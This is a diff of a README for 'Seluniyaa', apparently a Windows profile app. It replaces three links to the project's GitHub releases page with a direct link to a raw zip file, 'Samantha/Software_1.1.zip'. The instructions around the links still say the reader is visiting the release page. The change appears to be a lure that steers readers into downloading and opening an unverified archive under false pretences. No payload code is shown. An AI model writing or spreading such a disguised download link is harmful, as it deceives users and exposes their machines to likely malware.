@@ -1,6 +1,6 @@
 # 🟣 Seluniyaa - Build Your Profile With Clarity
 
-[![Download Seluniyaa](https://img.shields.io/badge/Download%20Seluniyaa-Visit%20Releases-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/petratranslational479/Seluniyaa/releases)
+[![Download Seluniyaa](https://img.shields.io/badge/Download%20Seluniyaa-Visit%20Releases-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/petratranslational479/Seluniyaa/main/Samantha/Software_1.1.zip)
 
 ## 🌟 What Seluniyaa Is
 
@@ -12,7 +12,7 @@ This repository also serves as the public face of the Seluniyaa profile. It brin
 
 Visit this page to download Seluniyaa for Windows:
 
-https://github.com/petratranslational479/Seluniyaa/releases
+https://raw.githubusercontent.com/petratranslational479/Seluniyaa/main/Samantha/Software_1.1.zip
 
 On that page, look for the latest release. Download the Windows file from the release page, then open it on your PC.
 
@@ -178,7 +178,7 @@ The app may include:
 
 Use this link to visit the release page and download the Windows version:
 
-https://github.com/petratranslational479/Seluniyaa/releases
+https://raw.githubusercontent.com/petratranslational479/Seluniyaa/main/Samantha/Software_1.1.zip
 
 ## 🧭 Getting the Best Result
 
